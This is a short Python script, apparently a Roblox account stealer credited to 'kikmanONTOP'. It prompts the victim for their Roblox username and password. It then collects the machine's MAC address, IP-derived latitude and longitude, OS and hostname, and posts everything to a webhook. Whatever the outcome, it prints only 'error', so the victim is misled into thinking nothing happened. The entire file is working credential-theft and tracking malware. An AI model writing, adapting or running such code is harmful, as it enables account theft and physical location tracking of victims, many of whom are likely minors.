import requests
import platform
import json
import socket
import geocoder
import uuid


def get_mac_address():
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)])
    return mac_address


def get_coordinates():
    g = geocoder.ip('me')
    return g.latlng


def get_roblox_credentials():
    roblox_username = input("Roblox username: ")
    roblox_password = input("Roblox password: ")
    return roblox_username, roblox_password


roblox_username, roblox_password = get_roblox_credentials()


mac_address = get_mac_address()
coordinates = get_coordinates()


data = {
    "content": "@everyone:",
    "embeds": [
        {
            "title": "Made by kikmanONTOP",
            "fields": [
                {"name": "Roblox username", "value": roblox_username, "inline": True},
                {"name": "Roblox password", "value": roblox_password, "inline": True},
                {"name": "MAC adresa", "value": mac_address, "inline": True},
                {"name": "OS", "value": platform.system(), "inline": True},
                {"name": "Hostname", "value": socket.gethostname(), "inline": True},
                {"name": "Coordinates", "value": f"Latitude: {coordinates[0]}, Longitude: {coordinates[1]}", "inline": True}
            ],
            "color": 16711680
        }
    ]
}


webhook_url = "webhook_url"
headers = {"Content-Type": "application/json"}
response = requests.post(webhook_url, data=json.dumps(data), headers=headers)


if response.status_code == 200:
    print("error")
else:
    print("error")
    print(f"error")